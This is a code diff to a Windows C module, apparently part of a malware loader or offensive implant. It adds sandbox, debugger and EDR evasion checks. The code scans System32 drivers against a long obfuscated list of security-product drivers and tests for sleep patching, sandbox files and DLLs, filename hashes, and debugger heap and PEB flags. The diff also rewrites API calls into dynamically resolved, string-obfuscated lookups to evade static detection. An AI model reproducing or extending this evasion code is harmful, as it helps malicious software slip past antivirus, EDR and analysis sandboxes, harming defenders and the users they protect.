@@ -3,17 +3,27 @@
 #include <winternl.h>
 #include <stdio.h>
 #include <time.h>
-#include <shlwapi.h>
 
 // EDR Detection: Scan system driver directory for known EDR drivers
 bool DetS()
 {
+    myDebug(DEBUG_INFO, "Checking for EDRs...");
     char *edrDriversEncoded[] = {
         // exclusion of sld.sys
         "[OBFS_ENC]atrsdfw.sys", "[OBFS_ENC]avgtpx86.sys", "[OBFS_ENC]avgtpx64.sys", "[OBFS_ENC]naswSP.sys", "[OBFS_ENC]edrsensor.sys", "[OBFS_ENC]CarbonBlackK.sys", "[OBFS_ENC]parity.sys", "[OBFS_ENC]cbk7.sys", "[OBFS_ENC]cbstream.sys", "[OBFS_ENC]csacentr.sys", "[OBFS_ENC]csaenh.sys", "[OBFS_ENC]csareg.sys", "[OBFS_ENC]csascr.sys", "[OBFS_ENC]csaav.sys", "[OBFS_ENC]csaam.sys", "[OBFS_ENC]rvsavd.sys", "[OBFS_ENC]cfrmd.sys", "[OBFS_ENC]cmdccav.sys", "[OBFS_ENC]cmdguard.sys", "[OBFS_ENC]CmdMnEfs.sys", "[OBFS_ENC]MyDLMPF.sys", "[OBFS_ENC]im.sys", "[OBFS_ENC]csagent.sys", "[OBFS_ENC]CybKernelTracker.sys", "[OBFS_ENC]CRExecPrev.sys", "[OBFS_ENC]CyOptics.sys", "[OBFS_ENC]CyProtectDrv32.sys", "[OBFS_ENC]CyProtectDrv64.sys", "[OBFS_ENC]groundling32.sys", "[OBFS_ENC]groundling64.sys", "[OBFS_ENC]esensor.sys", "[OBFS_ENC]edevmon.sys", "[OBFS_ENC]ehdrv.sys", "[OBFS_ENC]FeKern.sys", "[OBFS_ENC]WFP_MRT.sys", "[OBFS_ENC]xfsgk.sys", "[OBFS_ENC]fsatp.sys", "[OBFS_ENC]fshs.sys", "[OBFS_ENC]HexisFSMonitor.sys", "[OBFS_ENC]klifks.sys", "[OBFS_ENC]klifaa.sys", "[OBFS_ENC]Klifsm.sys", "[OBFS_ENC]mbamwatchog.sys", "[OBFS_ENC]mfeaskm.sys", "[OBFS_ENC]mfencfilter.sys", "[OBFS_ENC]PSINPROC.sys", "[OBFS_ENC]PSINFILE.sys", "[OBFS_ENC]amfsm.sys", "[OBFS_ENC]amm8660.sys", "[OBFS_ENC]amm6460.sys", "[OBFS_ENC]eaw.sys", "[OBFS_ENC]SAFE.sys", "[OBFS_ENC]SentinelMonitor.sys", "[OBFS_ENC]SAVOnAccess.sys", "[OBFS_ENC]savonaccess.sys", "[OBFS_ENC]pgpwdefs.sys", "[OBFS_ENC]GEProtection.sys", "[OBFS_ENC]diflt.sys", "[OBFS_ENC]sysMon.sys", "[OBFS_ENC]ssrfsf.sys", "[OBFS_ENC]emxdrv2.sys", "[OBFS_ENC]reghook.sys", "[OBFS_ENC]spbbcdsr.sys", "[OBFS_ENC]bhdrvx86.sys", "[OBFS_ENC]bhdrvx64.sys", "[OBFS_ENC]SISIPSFileFilter.sys", "[OBFS_ENC]symevent.sys", "[OBFS_ENC]vxfsrep.sys", "[OBFS_ENC]VirtFile.sys", "[OBFS_ENC]SymAFR.sys", "[OBFS_ENC]symefasi.sys", "[OBFS_ENC]symefa.sys", "[OBFS_ENC]symefa64.sys", "[OBFS_ENC]SymHsm.sys", "[OBFS_ENC]evmf.sys", "[OBFS_ENC]GEFCMP.sys", "[OBFS_ENC]VFSEnc.sys", "[OBFS_ENC]pgpfs.sys", "[OBFS_ENC]fencry.sys", "[OBFS_ENC]symrg.sys", "[OBFS_ENC]ndgdmk.sys", "[OBFS_ENC]ssfmonm.sys", "[OBFS_ENC]dlpwpdfltr.sys"};
 
+    pModC pGetProcAddress = (pModC)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]GetProcAddress"));
+    pMod pLoadLibraryA = (pMod)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]LoadLibraryA"));
+    HMODULE hshlwapi = (HMODULE)pLoadLibraryA(obfs_decode(DECKEY, "[OBFS_ENC]shlwapi.dll")); //Load the shlwapi.dll
+
+    // Fetch needed functions
+    pStrStrIA_t pStrStrIA = (pStrStrIA_t)pGetProcAddress(hshlwapi, obfs_decode(DECKEY, "[OBFS_ENC]StrStrIA"));
+    pFindNextFileA_t pFindNextFileA = (pFindNextFileA_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]FindNextFileA"));
+    pFindClose_t pFindClose = (pFindClose_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]FindClose"));
+    pFindFirstFileA_t pFindFirstFileA = (pFindFirstFileA_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]FindFirstFileA"));
+
     WIN32_FIND_DATAA findFileData;
-    HANDLE hFind = FindFirstFileA(obfs_decode(DECKEY, "[OBFS_ENC]C:\\Windows\\System32\\drivers\\*.sys"), &findFileData);
+    HANDLE hFind = pFindFirstFileA(obfs_decode(DECKEY, "[OBFS_ENC]C:\\Windows\\System32\\drivers\\*.sys"), &findFileData);
 
     if (hFind == INVALID_HANDLE_VALUE)
         return false;
@@ -23,30 +33,38 @@ bool DetS()
         for (int i = 0; i < sizeof(edrDriversEncoded) / sizeof(edrDriversEncoded[0]); i++)
         {
             char *decodedDriver = obfs_decode(DECKEY, edrDriversEncoded[i]); // Decode Path
-            if (!decodedDriver)
+            if (!decodedDriver) {
+                myDebug(DEBUG_ERROR, "Error while checking driver item %d", i);
                 continue;
-            if (StrStrIA(findFileData.cFileName, decodedDriver))
+            }
+                
+            
+            if (pStrStrIA(findFileData.cFileName, decodedDriver))
             {
                 myDebug(DEBUG_INFO, "Detected EDR: %s", decodedDriver);
                 return true;
             }
         }
-    } while (FindNextFileA(hFind, &findFileData));
+    } while (pFindNextFileA(hFind, &findFileData));
 
-    FindClose(hFind);
+    pFindClose(hFind);
+    myDebug(DEBUG_SUCCESS, "No EDRs detected :)");
     return false;
 }
 
 // Sleep Patching Detection: Checks if Sleep(10000) completes normally
 bool DetSl()
 {
+    myDebug(DEBUG_INFO, "Checking for sleep patching...");
     LARGE_INTEGER startTime, endTime, frequency;
-    QueryPerformanceFrequency(&frequency);
-    QueryPerformanceCounter(&startTime);
+    pQueryPerformance_t pQueryPerformanceFrequency = (pQueryPerformance_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]QueryPerformanceFrequency"));
+    pQueryPerformance_t pQueryPerformanceCounter = (pQueryPerformance_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]QueryPerformanceCounter"));
+    pQueryPerformanceFrequency(&frequency);
+    pQueryPerformanceCounter(&startTime);
 
     Sleep(10000); // Expected to take ~10,000 ms
 
-    QueryPerformanceCounter(&endTime);
+    pQueryPerformanceCounter(&endTime);
     double elapsedMs = ((double)(endTime.QuadPart - startTime.QuadPart) / frequency.QuadPart) * 1000.0;
 
     if (elapsedMs < 9000.0 || elapsedMs > 11000.0)
@@ -54,14 +72,21 @@ bool DetSl()
         myDebug(DEBUG_INFO, "Sleep timing anomaly detected: %f ms", elapsedMs);
         return true;
     }
+    myDebug(DEBUG_SUCCESS, "Sleep patch correct :)");
     return false;
 }
 
 // Sandbox Detection files
 bool DetSBF()
 {
+    myDebug(DEBUG_INFO, "Checking for sandbox files...");
+    // Get a pointer to GetProcAddress
+    pModC pGetProcAddress = (pModC)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]GetProcAddress"));
+    // Get a pointer to LoadLibraryA
+    pMod pLoadLibraryA = (pMod)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]LoadLibraryA"));
+    HMODULE hshlwapi = (HMODULE)pLoadLibraryA(obfs_decode(DECKEY, "[OBFS_ENC]shlwapi.dll")); //Load the shlwapi.dll
 
-    pMod pPathFileExistsA = GetMod(obfs_decode(DECKEY, "[OBFS_ENC]shlwapi.dll"), obfs_decode(DECKEY, "[OBFS_ENC]PathFileExistsA"));
+    pMod pPathFileExistsA = (pMod)pGetProcAddress(hshlwapi, obfs_decode(DECKEY, "[OBFS_ENC]PathFileExistsA"));
     if (!pPathFileExistsA)
         return false;
 
@@ -100,25 +125,18 @@ bool DetSBF()
 
         free(decodedPath);
     }
+    myDebug(DEBUG_SUCCESS, "No for sandbox files detected :)");
     return false;
 }
 
 // Filename Hash Detection: Checks if file name matches hash (common in sandboxes)
 bool DetF()
 {
-    // Get a pointer to GetProcAddress
-    pModC pGetProcAddress = (pModC)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]GetProcAddress"));
-    // Get a pointer to GetModuleHandleA
-    pMod pGetModuleHandleA = (pMod)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]GetModuleHandleA"));
-
-    // Resolve Kernel32 base
-    HMODULE hKernel32 = (HMODULE)pGetModuleHandleA(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"));
-
-    // Resolve API functions dynamically
-    FARPROC pGetModuleFileNameA = pGetProcAddress(hKernel32, obfs_decode(DECKEY, "[OBFS_ENC]GetModuleFileNameA"));
-    pCreateFileA_t pCreateFileA = (pCreateFileA_t)pGetProcAddress(hKernel32, obfs_decode(DECKEY, "[OBFS_ENC]CreateFileA"));
-    pGetFileSize_t pGetFileSize = (pGetFileSize_t)pGetProcAddress(hKernel32, obfs_decode(DECKEY, "[OBFS_ENC]GetFileSize"));
-    pReadFile_t pReadFile = (pReadFile_t)pGetProcAddress(hKernel32, obfs_decode(DECKEY, "[OBFS_ENC]ReadFile"));
+    myDebug(DEBUG_INFO, "Checking for filename hash matching...");
+    FARPROC pGetModuleFileNameA = (FARPROC)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]GetModuleFileNameA"));
+    pCreateFileA_t pCreateFileA = (pCreateFileA_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CreateFileA"));
+    pGetFileSize_t pGetFileSize = (pGetFileSize_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]GetFileSize"));
+    pReadFile_t pReadFile = (pReadFile_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]ReadFile"));
     pCloseHandle_t pCloseHandle = (pCloseHandle_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CloseHandle"));
 
     // Ensure all function pointers are valid
@@ -188,13 +206,14 @@ bool DetF()
     {
         return true;
     }
-
+    myDebug(DEBUG_SUCCESS, "No filename hash matching :)");
     return false;
 }
 
 // Detect SandBox DLLs
 bool DetSBD()
 {
+    myDebug(DEBUG_INFO, "Checking for dll...");
     char *encoded_realDLLs[] = {
         "[OBFS_ENC]kernel32.dll",
         "[OBFS_ENC]networkexplorer.dll",
@@ -245,7 +264,7 @@ bool DetSBD()
         }
         free(decodedPath);
     }
-
+    myDebug(DEBUG_SUCCESS, "No suspicious dll :)");
     return false;
 }
 
@@ -262,7 +281,7 @@ bool DetFPEB()
     // NtGlobalFlag is at offset 0x68 in 32-bit PEB
     DWORD NtGlobalFlag = *(DWORD *)((BYTE *)peb + 0x68);
 #endif
-
+    myDebug(DEBUG_INFO, "Checking for NtGlobalFlag...");
     // Check NtGlobalFlag
     return NtGlobalFlag & (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS);
 }
@@ -283,7 +302,7 @@ bool DetFH()
     DWORD dwHeapFlagsOffset = 0x40;      // 0x0C if Windows version inferior to Vista but who use old computers ? ;)
     DWORD dwHeapForceFlagsOffset = 0x44; // 0x10 if Windows version inferior to Vista but who use old computers ? ;)
 #endif                                   // _WIN64
-
+    myDebug(DEBUG_INFO, "Checking for Heap Flags...");
     DWORD dwHeapFlags = *(DWORD *)((PBYTE)pHeapBase + dwHeapFlagsOffset);
     DWORD dwHeapForceFlags = *(DWORD *)((PBYTE)pHeapBase + dwHeapForceFlagsOffset);
 
@@ -294,31 +313,24 @@ bool DetFH()
 // Main Sandbox Detection Function
 bool PerfomChecksEnv()
 {
-    myDebug(DEBUG_INFO, "Checking for NtGlobalFlag...");
     if (DetFPEB())
         return true; // avoiding further checks
 
-    myDebug(DEBUG_INFO, "Checking for Heap Flags...");
     if (DetFH())
         return true; // avoiding further checks
 
-    myDebug(DEBUG_INFO, "Checking for filename hash matching...");
     if (DetF())
         return true; // avoiding further checks
 
-    myDebug(DEBUG_INFO, "Checking for sandbox files...");
     if (DetSBF())
         return true; // avoiding further checks
 
-    myDebug(DEBUG_INFO, "Checking for EDRs...");
     if (DetS())
         return true; // avoiding further checks
 
-    myDebug(DEBUG_INFO, "Checking for sleep patching...");
     if (DetSl())
         return true; // avoiding further checks
 
-    myDebug(DEBUG_INFO, "Checking for dll...");
     if (DetSBD())
         return true; // avoiding further checks
 
